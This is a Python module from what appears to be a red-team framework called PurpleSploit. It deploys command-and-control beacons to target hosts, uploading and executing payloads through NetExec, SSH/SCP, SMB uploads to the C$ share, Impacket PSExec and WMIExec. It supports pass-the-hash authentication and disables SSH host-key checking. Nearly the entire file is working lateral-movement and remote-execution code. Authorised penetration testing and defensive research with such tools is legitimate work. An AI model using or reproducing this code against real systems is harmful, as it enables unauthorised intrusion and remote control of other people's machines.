"""
C2 Beacon Deployment Module

Deploy C2 beacons/payloads to target systems.
Supports multiple deployment methods: NXC, SSH, SMB, PSExec, WMIExec, WinRM.
"""

from purplesploit.core.module import BaseModule
import subprocess
from pathlib import Path
from typing import Dict, Any, List


class C2DeployModule(BaseModule):
    """
    C2 Beacon Deployment - Deploy C2 beacons and payloads to targets.

    Deploys C2 beacons (Sliver, Metasploit, Cobalt Strike, etc.) to target
    systems using various deployment methods.
    """

    def __init__(self, framework):
        super().__init__(framework)

    @property
    def name(self) -> str:
        return "C2 Beacon Deploy"

    @property
    def description(self) -> str:
        return "Deploy C2 beacons and payloads to target systems"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "deploy"

    def get_operations(self) -> List[Dict[str, Any]]:
        """Return list of C2 beacon deployment operations."""
        return [
            {
                "name": "Deploy via NXC",
                "description": "Deploy C2 beacon using NetExec (NXC) - Windows targets",
                "handler": self.deploy_via_nxc
            },
            {
                "name": "Deploy via SSH",
                "description": "Deploy C2 beacon via SSH - Linux/Unix targets",
                "handler": self.deploy_via_ssh
            },
            {
                "name": "Deploy via SMB",
                "description": "Deploy C2 beacon via SMB share upload - Windows targets",
                "handler": self.deploy_via_smb
            },
            {
                "name": "Deploy via PSExec",
                "description": "Deploy C2 beacon using Impacket PSExec - Windows targets",
                "handler": self.deploy_via_psexec
            },
            {
                "name": "Deploy via WMIExec",
                "description": "Deploy C2 beacon using Impacket WMIExec - Windows targets",
                "handler": self.deploy_via_wmiexec
            },
            {
                "name": "Deploy via WinRM",
                "description": "Deploy C2 beacon using WinRM/Evil-WinRM - Windows targets",
                "handler": self.deploy_via_winrm
            },
        ]

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target host IP address",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": False,
                "description": "Username for authentication",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": "",
                "required": False,
                "description": "Domain for Windows authentication",
                "default": ""
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash for authentication",
                "default": None
            },
            "SSH_KEY": {
                "value": None,
                "required": False,
                "description": "SSH private key path (for SSH deployment)",
                "default": None
            },
            "LOCAL_FILE": {
                "value": None,
                "required": True,
                "description": "Path to C2 beacon/payload file",
                "default": None
            },
            "REMOTE_PATH": {
                "value": None,
                "required": False,
                "description": "Remote path where beacon will be deployed",
                "default": None
            },
            "EXECUTE": {
                "value": True,
                "required": False,
                "description": "Execute the beacon after deployment",
                "default": True
            },
            "EXEC_ARGS": {
                "value": "",
                "required": False,
                "description": "Arguments to pass when executing the beacon",
                "default": ""
            },
            "TARGET_OS": {
                "value": "windows",
                "required": False,
                "description": "Target OS (windows, linux)",
                "default": "windows"
            },
            "BEACON_TYPE": {
                "value": "generic",
                "required": False,
                "description": "Type of C2 beacon (sliver, metasploit, cobalt, generic)",
                "default": "generic"
            }
        })

    def deploy_via_nxc(self) -> Dict[str, Any]:
        """Deploy C2 beacon via NetExec."""
        self.log("Deploying C2 beacon via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Determine remote path based on filename
            filename = Path(local_file).name
            remote_path = f"C:\\Windows\\Temp\\{filename}"

            # Build NXC upload command
            cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                cmd.extend(["-d", domain])

            if hash_val:
                cmd.extend(["-H", hash_val])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading beacon to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            output = result.stdout

            # Execute if requested
            if execute:
                exec_cmd = ["nxc", "smb", rhost, "-u", username]

                if domain:
                    exec_cmd.extend(["-d", domain])

                if hash_val:
                    exec_cmd.extend(["-H", hash_val])
                else:
                    exec_cmd.extend(["-p", password])

                exec_command = f"{remote_path} {exec_args}".strip()
                exec_cmd.extend(["-x", exec_command])

                self.log("Executing beacon...")
                exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=60)
                output += "\n" + exec_result.stdout

            self.log("C2 beacon deployed successfully", "success")
            return {
                "success": True,
                "output": output,
                "method": "nxc",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"NXC deployment failed: {str(e)}"
            }

    def deploy_via_ssh(self) -> Dict[str, Any]:
        """Deploy C2 beacon via SSH."""
        self.log("Deploying C2 beacon via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name
            remote_path = f"/tmp/{filename}"

            # Upload via SCP
            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading beacon to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            output = ""

            # Execute if requested
            if execute:
                exec_command = f"chmod +x {remote_path} && nohup {remote_path} {exec_args} &"

                if ssh_key:
                    ssh_cmd = [
                        "ssh", "-i", ssh_key,
                        "-o", "StrictHostKeyChecking=no",
                        f"{username}@{rhost}",
                        exec_command
                    ]
                else:
                    ssh_cmd = [
                        "sshpass", "-p", password,
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        f"{username}@{rhost}",
                        exec_command
                    ]

                self.log("Executing beacon...")
                exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=60)
                output = exec_result.stdout

            self.log("C2 beacon deployed successfully", "success")
            return {
                "success": True,
                "output": output,
                "method": "ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"SSH deployment failed: {str(e)}"
            }

    def deploy_via_smb(self) -> Dict[str, Any]:
        """Deploy C2 beacon via SMB."""
        self.log("Deploying C2 beacon via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, filename
            )

            if not upload_result["success"]:
                return upload_result

            # Execute if requested
            if execute:
                exec_result = self._execute_via_wmi(
                    rhost, username, password, domain, None,
                    upload_result["remote_path"],
                    exec_args
                )

                if exec_result["success"]:
                    self.log("C2 beacon deployed successfully", "success")

                return exec_result
            else:
                self.log("C2 beacon uploaded successfully", "success")
                return {
                    "success": True,
                    "output": "Beacon uploaded (not executed)",
                    "method": "smb",
                    "remote_path": upload_result["remote_path"]
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"SMB deployment failed: {str(e)}"
            }

    def deploy_via_psexec(self) -> Dict[str, Any]:
        """Deploy C2 beacon via PSExec."""
        self.log("Deploying C2 beacon via PSExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Build auth string
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Execute via PSExec with file copy
            exec_command = f"{filename} {exec_args}".strip()
            cmd = [
                "impacket-psexec",
                auth,
                "-c", local_file,
                exec_command
            ]

            self.log("Deploying via PSExec...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            if "Impacket" in result.stdout or result.returncode == 0:
                self.log("C2 beacon deployed successfully", "success")
                return {
                    "success": True,
                    "output": result.stdout,
                    "method": "psexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"PSExec failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"PSExec deployment failed: {str(e)}"
            }

    def deploy_via_wmiexec(self) -> Dict[str, Any]:
        """Deploy C2 beacon via WMIExec."""
        self.log("Deploying C2 beacon via WMIExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, filename
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, hash_val,
                upload_result["remote_path"],
                exec_args
            )

            if exec_result["success"]:
                self.log("C2 beacon deployed successfully", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"WMIExec deployment failed: {str(e)}"
            }

    def deploy_via_winrm(self) -> Dict[str, Any]:
        """Deploy C2 beacon via WinRM."""
        self.log("Deploying C2 beacon via WinRM...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        local_file = self.get_option("LOCAL_FILE")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        self.log("Note: WinRM deployment requires hosting the file on a web server")
        self.log("Consider using 'webserver start' command to host the file", "info")

        return {
            "success": False,
            "error": "WinRM deployment requires manual file hosting. Use NXC or SMB instead."
        }

    def _upload_via_smb(self, rhost: str, username: str, password: str,
                        domain: str, local_file: str, remote_filename: str) -> Dict[str, Any]:
        """Helper method to upload file via SMB."""
        share = "C$"
        remote_path = f"Windows\\Temp\\{remote_filename}"
        full_remote_path = f"C:\\{remote_path}"

        auth_user = f"{domain}/{username}" if domain else username
        auth_string = f"{auth_user}%{password}"

        cmd = [
            "smbclient",
            f"//{rhost}/{share}",
            "-U", auth_string,
            "-c", f"put {local_file} {remote_path}"
        ]

        self.log(f"Uploading via SMB to {rhost}...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        if result.returncode == 0:
            self.log("Upload successful", "success")
            return {
                "success": True,
                "remote_path": full_remote_path,
                "method": "smb"
            }
        else:
            return {
                "success": False,
                "error": f"SMB upload failed: {result.stderr}"
            }

    def _execute_via_wmi(self, rhost: str, username: str, password: str,
                         domain: str, hash_val: str, remote_path: str,
                         args: str) -> Dict[str, Any]:
        """Helper method to execute file via WMI."""
        auth = f"{domain}/{username}" if domain else username

        if hash_val:
            auth += f"@{rhost} -hashes :{hash_val}"
        elif password:
            auth += f":{password}@{rhost}"
        else:
            return {"success": False, "error": "No PASSWORD or HASH provided"}

        exec_command = f"{remote_path} {args}".strip()

        cmd = [
            "impacket-wmiexec",
            auth,
            exec_command
        ]

        self.log("Executing via WMI...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0 or "Impacket" in result.stdout:
            self.log("Execution successful", "success")
            return {
                "success": True,
                "output": result.stdout,
                "method": "wmiexec"
            }
        else:
            return {
                "success": False,
                "error": f"WMI execution failed: {result.stderr}"
            }

    def run(self) -> Dict[str, Any]:
        """Run the module."""
        return {
            "success": True,
            "message": "Select a deployment operation to continue"
        }
